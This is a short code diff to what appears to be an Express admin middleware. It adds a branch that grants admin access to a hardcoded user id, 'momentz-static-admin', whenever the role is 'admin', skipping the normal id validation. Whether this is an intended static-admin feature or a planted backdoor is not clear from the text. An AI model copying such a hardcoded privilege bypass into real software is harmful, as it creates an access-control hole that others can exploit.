@@ -12,6 +12,14 @@ function isValidId(value) {
 
 async function adminMiddleware(req, res, next) {
   const userId = req.user?.id;
+  if (
+    String(userId) === "momentz-static-admin" &&
+    String(req.user?.role || "").toLowerCase() === "admin"
+  ) {
+    req.admin = { id: userId };
+    return next();
+  }
+
   if (!isValidId(userId)) {
     return res.status(401).json({
       success: false,
